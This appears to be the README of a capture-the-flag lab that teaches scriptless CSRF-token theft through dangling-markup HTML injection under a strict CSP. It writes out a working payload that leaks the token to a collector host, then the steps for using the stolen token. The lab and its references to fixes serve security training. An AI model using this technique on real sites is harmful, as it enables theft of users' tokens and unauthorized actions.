# Dangling Markup — Stealing a CSRF Token Without Executing JS

> Track: `xss` · Difficulty: **expert** · ~50 min · Free hints.

## Scenario

**Linkboard**'s staff review page, `GET /page?u=<url>`, reflects the `u` value
**raw** into an **unquoted** HTML attribute (a URL context), and its CSP blocks all
scripts:

```
default-src 'self'; script-src 'none'; img-src *; style-src *; …
```

`script-src 'none'` kills every `<script>` and `onerror` payload. But the page is
rendered on **one line**, and a hidden CSRF token sits further along it:

```html
…<link rel=stylesheet href=<u>>…<input type=hidden name=csrf value=<TOKEN>>…<a href='/home'>…
```

`/page` is **staff-only** (403 for you), so you can't read the token directly — but
the admin bot renders it, with its session, every couple of seconds (queue a path
via `POST /report`).

## Objective

You can't run JavaScript, but you don't need to. Because `u` is reflected **raw
into an unquoted attribute**, you can inject a **dangling** tag — one whose
resource URL is left _open_:

```
u = x><img src='http://collector:9000/leak?d=
```

renders as `<link rel=stylesheet href=x><img src='http://collector:9000/leak?d=…`.
That `<img>`'s single-quoted `src` is never closed by you, so the HTML parser
swallows the rest of the source line — **including `value=<TOKEN>`** — until the
next `'` (in the trailing `<a href='/home'>`). The browser then fetches that URL,
and the token rides along to the collector.

Read what the collector captured via `GET /oob/received`, pull the token out, and
use it:

```
POST /admin/action   {"csrf":"<leaked token>"}
POST /solve                                       → FLAG{…}
```

## Getting Started

1. Confirm scripts are dead: the CSP is `script-src 'none'`. But `img-src` is open —
   loading an image is not "executing a script." What can an `<img>` do that leaks
   data without any JS?
2. `u` lands **raw** in an **unquoted** attribute. If you open a quoted `src` and
   never close it, how much of the page does the parser read into that URL — and
   what sits between your injection and the next quote?
3. There's a catch worth knowing (it shapes the payload): a browser won't send a
   resource URL that was formed across a **newline**. Everything you need is on one
   line here — so the capture works.

**CWE-79 (Injection) + CWE-201 (Insertion of Sensitive Information Into Sent Data).
OWASP A03:2021 – Injection.** The fixes — encode reflected values, quote attributes,
keep secrets off reflect-y pages — are in `SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Go/Echo `html/template` page with inconsistent
attribute quoting. This lab **re-platforms it to Flask**: the vulnerable branch
reflects `?u=` raw into an unquoted attribute, on a **single-line** template (so the
dangling capture isn't broken by a newline — see `SOLUTION.md` for why that matters
in modern Chrome). The taught primitive — scriptless token theft via dangling markup
under `script-src 'none'` — is identical.
